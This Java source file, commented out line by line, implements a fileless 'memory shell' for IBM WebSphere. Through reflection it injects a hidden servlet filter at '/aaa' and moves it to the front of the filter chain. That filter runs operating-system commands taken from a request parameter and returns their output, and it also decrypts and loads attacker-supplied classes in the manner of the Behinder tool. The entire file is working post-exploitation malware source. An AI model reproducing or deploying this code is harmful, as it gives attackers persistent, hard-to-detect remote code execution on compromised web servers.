//package com.memshell.websphere;
//
//import javax.crypto.Cipher;
//import javax.crypto.spec.SecretKeySpec;
//import javax.servlet.*;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.io.IOException;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.util.EnumSet;
//import java.util.List;
//import java.util.Scanner;
//import java.util.UUID;
//
//public class FilterBasedBasic extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//
//        try{
//            String filterName = "myFilter1";
//            String urlPattern = "/aaa";
//            final String password = "pass";
//
//            ServletContext servletContext = req.getServletContext();
//
//            Field field = servletContext.getClass().getDeclaredField("context");
//            field.setAccessible(true);
//            Object context = field.get(servletContext);
//
//            field = context.getClass().getSuperclass().getDeclaredField("config");
//            field.setAccessible(true);
//            Object webAppConfiguration = field.get(context);
//
//            Method method = null;
//            Method[] methods = webAppConfiguration.getClass().getMethods();
//            for(int i = 0; i < methods.length; i++){
//                if(methods[i].getName().equals("getFilterMappings")){
//                    method = methods[i];
//                    break;
//                }
//            }
//            List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);
//
//            boolean flag = false;
//            for(int i = 0; i < filerMappings.size(); i++){
//                Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
//                String name = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
//                if(name.equals(filterName)){
//                    flag = true;
//                    break;
//                }
//            }
//
//            //如果已存在同名的 Filter，就不在添加，防止重复添加
//            if(!flag){
//                System.out.println("[+] Add Dynamic Filter");
//
//                Filter filter = new Filter() {
//                    @Override
//                    public void init(FilterConfig filterConfig) throws ServletException {
//
//                    }
//
//                    @Override
//                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
//                        System.out.println("[+] Dynamic Filter says hello");
//
//                        String type = servletRequest.getParameter("type");
//                        if(type != null && type.equals("basic")){
//                            String cmd = servletRequest.getParameter(password);
//                            if(cmd != null && !cmd.isEmpty()){
//                                String result = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
//                                servletResponse.getWriter().println(result);
//                            }
//                        }else if(type != null && type.equals("behinder")){
//                            try{
//                                if(servletRequest.getParameter(password)!=null){
//                                    String key = ("" + UUID.randomUUID()).replace("-","").substring(16);
//                                    ((HttpServletRequest)servletRequest).getSession().setAttribute("u", key);
//                                    servletResponse.getWriter().print(key);
//                                    return;
//                                }
//
//                                Cipher cipher = Cipher.getInstance("AES");
//                                cipher.init(2, new SecretKeySpec((((HttpServletRequest)servletRequest).getSession().getAttribute("u") + "").getBytes(), "AES"));
//                                byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(servletRequest.getReader().readLine()));
//                                Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
//                                Object evilObject = evilClass.newInstance();
//                                Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
//                                targetMethod.invoke(evilObject, new Object[]{servletRequest, servletResponse});
//                            }catch(Exception e){
//                                e.printStackTrace();
//                            }
//                        }else{
//                            filterChain.doFilter(servletRequest, servletResponse);
//                        }
//                    }
//
//                    @Override
//                    public void destroy() {
//
//                    }
//
//                    class U extends ClassLoader{
//                        U(ClassLoader c){super(c);}
//
//                        public Class g(byte []b){return super.defineClass(b,0,b.length);}
//                    }
//                };
//
//                Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
//                filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});
//
//                method = null;
//                methods = webAppConfiguration.getClass().getMethods();
//                for(int i = 0; i < methods.length; i++){
//                    if(methods[i].getName().equals("addFilterInfo")){
//                        method = methods[i];
//                        break;
//                    }
//                }
//                method.invoke(webAppConfiguration, new Object[]{filterConfig});
//
//                field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
//                field.setAccessible(true);
//                Object original = field.get(filterConfig);
//
//                //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
//                field.set(filterConfig, null);
//
//                method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
//                method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});
//
//                //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
//                field.set(filterConfig, original);
//
//                method = null;
//                methods = webAppConfiguration.getClass().getMethods();
//                for(int i = 0; i < methods.length; i++){
//                    if(methods[i].getName().equals("getUriFilterMappings")){
//                        method = methods[i];
//                        break;
//                    }
//                }
//
//                //这里的目的是为了将我们添加的动态 Filter 放到第一位
//                List uriFilterMappingInfos = (List)method.invoke(webAppConfiguration, new Object[0]);
//                uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));
//            }
//        }catch(Exception e){
//            e.printStackTrace();
//        }
//    }
//}